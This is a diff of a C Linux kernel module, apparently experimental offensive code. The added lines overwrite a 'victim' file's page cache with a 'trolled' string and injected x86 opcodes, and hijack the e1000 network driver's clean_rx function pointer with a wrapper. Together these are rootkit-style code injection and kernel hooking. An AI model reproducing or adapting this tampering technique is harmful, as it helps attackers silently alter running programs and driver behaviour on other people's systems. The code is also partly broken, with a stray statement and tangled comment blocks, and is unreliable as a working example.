@@ -19,15 +19,28 @@ const char* net_adapter = "e1000";
 
 const char* troll = "trolled";
 
+struct inode* i;
+struct page* old_opcode;
+struct page* new_opcode;
+struct page* old_troll;
+struct page* new_troll;
 
+struct e1000_adapter* e1000;
+
+bool (*old_clean_rx)(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do);
+
+
+bool new_clean_rx(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do){
+  return old_clean_rx(adapter, rx_ring, work_done, work_to_do); //LULW
+}
 
 char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }  ; //append with a shit ton of nops
 int init_module(void)
 {
   
   printk(KERN_INFO "Printing out pci devices\n");
- /* char* path = VICTIM_FILE_OVERRIDE;
-  struct inode* i = get_file_path(path);//
+  char* path = VICTIM_FILE_OVERRIDE;
+  i = get_file_path(path);//
   if(!i){
     printk(KERN_INFO "Invalid path\n");
     return 0;
@@ -41,15 +54,26 @@ int init_module(void)
   printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");
 
   //unmap_page(i, 0x00107c10);
-  //write_string_page_cache(i, 0x00191027, troll, 8);
-  //write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21);
-  remove_page(i, 0x00107c10); //extraction confirmed
-  remove_page(i, 0x00191027);*/
+  write_string_page_cache(i, 0x00191027, troll, 8, new_troll, old_troll);
+  write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21, new_opcode, old_opcode);
+  old_opcode
+  //remove_page(i, 0x00107c10); //extraction confirmed
+  //remove_page(i, 0x00191027);
+
+
+
+
+
+
+
+
+
+
 
   //enumerate_pci();
   //printk(KERN_INFO "%lx\n", (unsigned long)net_adapter);
   //printk(KERN_INFO "%s\n", net_adapter);
-  struct pci_dev* pd = find_pci(net_adapter, 5);
+  /*struct pci_dev* pd = find_pci(net_adapter, 5);
   
   if(pd){
     printk("pci name: %s\n", get_dev_name(pd));
@@ -68,13 +92,19 @@ int init_module(void)
 
 
   printk("MTU: %u\n", nd -> mtu);
-  struct e1000_adapter* e1000 = get_e1000_adapter(nd);
+  e1000 = get_e1000_adapter(nd);
   
   if(!e1000){
     printk(KERN_INFO "Couldn't find e1000 adapter");
     return 0;
   }
-  if(e1000 -> pdev == pd && e1000 -> netdev == nd){
+
+
+  old_clean_rx = e1000->clean_rx; //save old clean_rx
+  
+  e1000->clean_rx = new_clean_rx; //add new, shitty clean_rx*/
+
+  /*if(e1000 -> pdev == pd && e1000 -> netdev == nd){
     printk(KERN_INFO "This is indeed the e1000\n");
   }else{
     printk(KERN_INFO "This is not the e1000\n");
@@ -100,21 +130,25 @@ int init_module(void)
     pr_info("Current NTU: %d\n", rx_ring->next_to_use);
     for(j = 0; j<E1000_RXBUFFER_2048; j++){
       pr_info("%c\n", *((char*)(buffer_info->rxbuf.data + NET_SKB_PAD + NET_IP_ALIGN + j))); //i have no fucking clue what this does
-    }
-    
+    }*/
     
 
-		/*pr_info("R[0x%03X]     %016llX %016llX %016llX %p %s\n",
-			i, u->a, u->b,
-			(u64)buffer_info->dma, buffer_info->rxbuf.data, type);*/
-  
-  //enable_irq(irq);
 
 
   return 0;
 }
 void cleanup_module(void)
 {
+  //replace_page(new_opcode, old_opcode);
+  //replace_page(new_troll, old_troll); //flipped around because
+
+
+  
+  
+  remove_page(i, 0x00107c10); //extraction confirmed
+  remove_page(i, 0x00191027);
+
+  
 	printk("Module cleanup\n");
 }
 MODULE_LICENSE("GPL");
